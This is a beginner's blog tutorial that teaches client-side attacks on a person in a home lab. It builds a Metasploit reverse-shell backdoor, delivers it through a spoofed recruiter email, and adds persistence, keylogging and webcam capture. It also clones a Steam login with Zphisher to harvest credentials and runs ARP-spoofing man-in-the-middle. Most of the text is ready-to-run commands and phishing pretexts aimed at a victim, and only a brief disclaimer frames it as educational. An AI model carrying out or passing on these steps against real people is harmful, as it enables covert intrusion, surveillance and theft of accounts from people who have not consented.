# 3 Ways of How to Hack Someone From 0

_20 min read - January 31, 2026 - by muhdsyahirk_

---

## Entry Log

In this mini-blog, I’ll show you how to do client-side hacking. While a lot of people focus on hacking into big servers, the reality of modern cybersecurity is that the "human element" is often the easiest path into a network.

Instead of targeting a machine, we will be looking at how an attacker targets the user. While there are many types of attacks out there, I will only show you three of them. Keep in mind that I will only be touching the surface, as I want to keep this guide as simple and easy to understand as possible.

Requirements:

1. Kali Linux
2. Victim

Tools covered:

1. Netdiscover
2. Metasploit Framework
3. Zphisher
4. Arpspoof

> **WARNING** Since I still consider myself a beginner, some of you might think this guide isn’t the best — and yes, my English isn’t perfect either. So, if you value your time, feel free to skip it.

> **DISCLAIMER** This mini-blog’s content is intended solely for educational purposes. I take no responsibility for any abuse of this material, nor do I support unlawful activity.

### Setting Up my Lab

For this demonstration, I’m using my Kali Linux VM as the attacking machine and my Windows VM as the target. You can follow these guides in your own lab or you can do it to someone where you have permission to do so.

![Lab Setup](./img/hack/Lab.png)

One more thing, I will be performing these attacks to the victim within the same network. If you need to gain access to the victim’s network, then check out my [previous post](./mini-blog.html?post=two). For hacking someone in a different network, it’s a little bit complicated, and it won’t be covered here.

---

## Getting our victim’s IP address

In Cyber Kill Chain, this step is called Reconnaissance. There are a lot more in Reconnaissance than just getting the victim’s IP address, as it often involves **OSINT** (Open Source Intelligence), which is essentially ‘spying’ on our target’s public information (e.g. daily activities, interests and potential vulnerabilities). To keep this guide short and simple, I will only focus on the technical part of finding the target.

If we are already in the same network as our target, we can simply do **Host Discovery** by sending **ARP ‘who-has’ packet** to broadcast. There are a lot of ways to do this, but I will show you using [**Netdiscover**](https://www.kali.org/tools/netdiscover/).

Netdiscover command:

```bash
netdiscover -i *iface* -r *ip_addr*/*subnet*
```

-i flag is to specify the network interface that we want to do the host discovery (and hacking later).

-r flag means range of ip addresses.

Output:

![Netdiscover Output](./img/hack/Netdiscover-output.png)

By doing these, we have identified the active hosts and their IPs in the network. You might be asking, “how do we know which IP address is our target?”, well I’ve got some good news and bad news for you.

Good news:

- If we are in a small network, there won’t be many devices.
- We can eliminate IP address that ends with ‘.1’ (which belongs to router) and our own IP address. to get our own IP address, run _ifconfig_ and refer to ‘inet’.
- Most of the tools mentioned above provide a ‘vendor’ output. If you know which device (brand) the target is using, you can narrow down your search. Since my victim is in the virtual machine, the vendor output is VMware.
- If the tool doesn’t provide a ‘vendor’ output or if it shows as ‘unknown’, you can look at the first three bytes of the MAC address to identify the manufacturer (keep in mind that modern devices often use randomised MAC addresses).
- If the same vendor appears multiple times, you can perform OS fingerprinting to figure out the operating system.
- You can also perform hostname identification by using a custom script (not covered here).

Bad news:

- You need to know by yourself.

OS fingerprinting using Nmap

```bash
nmap -O *ip_addr*
```

In my case, the victim’s IP address is 192.168.11.131.

---

## Phishing + Backdoor

A **backdoor** is simply a remote control of the system it gets executed on. It allows us to run system commands and access system resources such as storage, keyboards, webcams and more.

For this attack, I will be using [**Metasploit Framework (MSF)**](https://docs.metasploit.com/). Metasploit is a huge toolset, so I will focus on the most straightforward method for this demo.

### Getting Familiar with MSFvenom Payloads

To create our payload, we’ll be using **MSFvenom**. First, let’s list the available payloads

```bash
msfvenom --list payloads
```

![MSFvenom Payloads List](./img/hack/MSFvenom-payloads.png)

Most payloads are displayed as _platform_ / _type_ / _protocol._

- Platform: Windows, Linux, Android, OSX, Apple IOS, Python, Java, etc.
- Type: meterpreter, shell, dllinject (inject code to other file), peinject (inject code to portable exe file), vncinject (access desktop), exec, messagebox, etc.
- Protocol: reverse_tcp, reverse_https, bind_tcp, etc.

### Creating the Payload

For this demo, I’ll be using **windows/meterpreter/reverse_https**. There are two main ways for us to create a connection between us and the victim:

- Bind = we attempt to connect to our victim’s open port.
- Reverse = our victim connects back to our attacking machine.

Since most of the personal computers usually block incoming connections, we can do **Reverse**. When the victim runs the file, their computer initiates the connection to us.

Let’s look at the payload’s options

```bash
msfvenom --payload windows/meterpreter/reverse_https **--list-options
```

![Payload Options](./img/hack/Payload-options.png)

We are interested in the basic options, as LHOST and LPORT are required.

- LHOST = IP address of our attacking machine.
- LPORT = Port we want to listen on.

To create our payload

```bash
msfvenom --payload windows/meterpreter/reverse_https LHOST=*ip_addr* LPORT=8080 --format **exe --out rev_https_8080.exe
```

Then we get our payload in the current working directory. This will be sent to the victim later.

![Payload Created](./img/hack/Payload-created.png)

### Setting Up our Attacking Machine as the Listener

Now, we need to set up our attacking machine to listen to the incoming connection. We use **MSFconsole** and its multi/handler module for this

```bash
msfconsole
use exploit/multi/handler
```

Then we need to set the payload and its options same as before

```bash
set PAYLOAD windows/meterpreter/reverse_https
set LHOST *ip_addr*
set LPORT 8080
```

To verify

```bash
show options
```

Output:

![Multi Handler Options](./img/hack/Multi-Handler-options.png)

And when we’re ready to receive the connection, simply run

```bash
exploit
```

### Delivering the Payload

After creating our payload and setting up the listener, we can now deliver it to the victim. This is the hardest part because this payload can be detected by the Antivirus (AV). For this demo, I will disable the AV on the target machine, but in a real scenario, attackers use techniques like “Encoding” or “Obfuscation” to hide the malicious code.

To trick our victim into running our backdoor, we need to do phishing. Here is a fake scenario:

_“Person A is currently looking for an internship and has applied to EzDevMy for a software engineering position.”_

Based on this scenario, we can disguise ourself as a recruiter at EzDevMy. We can then ask Person A to debug the given .exe file as a technical assessment to test their skills (and hoping for them to run it). For this scenario, I renamed the file to _test_debug.exe_.

Since hiring processes usually use email for communication, I will send a spoofed email to the victim using Brevo as the SMTP server. (I will skip the steps for setting up Brevo account)

Since I’m already in the same network as the victim, I’ll host the file using a local [**Apache2**](https://www.kali.org/tools/apache2/#apache2) web server

```bash
cd /var/www/html/
sudo mkdir technical-assessment
cd technical-assessment
sudo cp ~/test_debug.exe test_debug.exe
sudo service apache2 start
```

Now, the file can be downloaded by entering _ip_addr_/technical-assessment/test_debug.exe into a browser URL.

Note: I know that this method of delivering the payload is bad, but I just want to make this guide as simple as possible.

To send the spoof email

```bash
sendemail -xu *login* -xp *password* -s *SMTP_server:port*
-t *victim_email* -f *spoofed_email*
-u "*email_title*" -m "*email_body_including_link*"
-o message-header="From: *spoofed_name* <*spoofed_email*>"
```

The -xu, -xp and -s flags are all obtained from Brevo (My profile → SMTP & API).

Note: You can also add -a flag for file attachment (instead of uploading the file to the web server like me). However, when I tried it, the email was blocked because the attachment was flagged as malicious.

My spoofed email:

![Technical Assessment Spoofed Email](./img/hack/backdoor-spoofed-email.png)

Our backdoor will be downloaded once the victim clicks on the link:

![Downloaded Backdoor](./img/hack/downloaded-backdoor.png)

### Post-Exploitation

After the victim runs the .exe file, we successfully gain control of their machine. To verify, simply run _sysinfo_

![Connection Received](./img/hack/connection-received.png)

If we type _ps_, we can see all of the running processes.

![Running Processess List](./img/hack/MSFconsole-ps.png)

We might lose our connection as soon as the user closes our program. To prevent this, it’s a good idea to migrate the process from test_debug.exe to explorer.exe. This is a safe process to hide in because it is the Windows GUI and is always running.

```bash
migrate *pid*
```

Now we can do whatever we want with the target machine such as:

![Opening Important File](./img/hack/steal-pass-ex.png)

Meterpreter has many powerful features such as:

- keyscan_start / keyscan_dump / keyscan_stop: To capture keystrokes.
- screenshot: To see the victim’s screen.
- webcam_snap: To take a photo from the webcam.

After this, we can perform further actions, such as maintaining access even after the victim restarts their computer, or moving laterally to hack other machines in the network (pivoting).

### Maintaining Access

If the victim restarts their computer, we will lose our connection. To prevent this, we need to establish persistence.

First, we need to put our current session in the background to access the **MSFconsole** and use the **persistence** module

```bash
background
use exploit/windows/local/persistence
show options
```

![Persistence Options](./img/hack/Persistence-options.png)

We need to configure these:

- DELAY = Amount of time (in seconds) the target waits before trying to reconnect to us.
- EXE_NAME = Process where the connection coming back from.
- SESSION = The background session (since we only have one, we will use 1)
- And if we do ‘show advanced’, we can see EXE::Custom. This is the custom payload we want to use for maintaining the access. (we’ll just use test_debug.exe)

```bash
set EXE_NAME explorer.exe
set SESSION 1
set EXE::Custom test_debug.exe
exploit
```

Once you run exploit, Metasploit will install a service on the target machine. Now, even if the victim restarts their computer, it will automatically reach back out to our listener.

![Persistence Exploit](./img/hack/Persistence-exploit.png)

The ‘Clean up Meterpreter RC file’ will be used later to remove the backdoor on the target machine.

To return to active session (where we control the target)

```bash
sessions -i 1
```

---

## Phishing + Credential Harvesting

**Credential harvesting** is an attack where the attacker tricks the victim into providing their sensitive information such as username and password. For this demonstration, i will be cloning a login page using a simple but powerful tool called [**Zphisher**](https://github.com/htr-tech/zphisher).

Here is a fake scenario:

_I’m a friend of Person A, and I want to send him a Steam Gift so we can play a game together._

First, we need to install Zphisher

```bash
git clone https://github.com/htr-tech/zphisher.git
cd zphisher
bash zphisher.sh
```

To run it, simply write this command

```bash
./zphisher.sh
```

![Zphisher](./img/hack/Zphisher.png)

### Setting Up the Phishing Page

Zphisher allows us to clone many popular login pages. Based on the given fake scenario, I will choose Steam by entering option 7.

Next, the tool will ask where we want to host the phishing site. For this simple demo, I will use Cloudflared, which provides a public URL so that the victim can access over the internet. I will also use the default settings for the URL:

![Zphisher Hosting](./img/hack/Zphisher-host.png)

Zphisher will then generate a URL (URL 1). This is the link that we’ll send to our victim:

![Zphisher Generated URL](./img/hack/Zphisher-url.png)

### Delivering the Attack

I chose email to deliver this attack because Steam typically uses email to notify the receiver for the gifts. Since my Brevo account got suspended, I’m sending the email manually for this demo. My spoofed email:

![Steam Gift Spoofed Email](./img/hack/ch-spoofed-email.png)

I know the email looks very suspicious and it’s not the same as Steam, but I just want to make this guide simple. In real attack, the attacker would make the email and the link look much more professional and legitimate.

### Harvesting the Credentials

When the victim clicks the link, they are taken to a fake login page that looks identical to the real Steam login:

![Fake Steam Login Page](./img/hack/fake-login.png)

As soon as the victim enters their details, Zphisher captures the information. We then receive their Public IP address, as well as their username and password:

![Credential Harvested](./img/hack/credential-harvested.png)

---

## Man-in-the-Middle (MitM)

A **Man-in-the-Middle (MitM)** attack occurs when an attacker intercepts the communication between a target device and the router. By positioning ourselves in the middle, we can monitor, capture, or even modify the data being sent.

The simplest way to perform MitM is through **ARP Spoofing** (also known as **ARP Poisoning**) by using [**arpspoof**](https://medium.com/@careertechnologymiraroad/arpspoof-network-tool-1185a5221ac6). For this demo, we will need three terminals and **Wireshark** to view the intercepted traffic.

In the first terminal, we tell the target machine that we are the gateway (router)

```bash
sudo arpspoof -i *network_iface* -t *target_ip gateway_ip*
```

In the second terminal, we tell the gateway (router) that we are the target machine

```bash
sudo arpspoof -i *network_iface* -t *gateway_ip target_ip*
```

At this point, the victim and the router are sending their data to our machine. However, if we don't forward that data to the correct destination, the victim will lose their internet connection, and they will know something is wrong.

In the third terminal, we must enable IP Forwarding so the packets can pass through our machine

```bash
sudo su
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Once the attack is running, we can open Wireshark to see the intercepted traffic. Every packet the victim sends or receives is now passing through our attacking machine.

![HTTP Example](./img/hack/mitm-ex.png)

However, many modern routers have built-in MitM prevention mechanisms. Additionally, most modern web traffic is encrypted using HTTPS, meaning the data looks like gibberish to us. We can generally only read data sent in plaintext (HTTP protocol).

To read encrypted data, an attacker would need to downgrade the connection from HTTPS to HTTP. However, this is increasingly difficult because of HSTS (HTTP Strict Transport Security).

HSTS is a security feature where the browser "remembers" that a website should only be loaded over HTTPS. If an attacker tries to downgrade the connection, the browser will detect the change and block the site for the user's safety.

---

## Session Terminated

Thanks for sticking with me until the end of this post. This guide might not be the best, but I hope now you can see the clear picture of how attackers hack someone. See you next time!
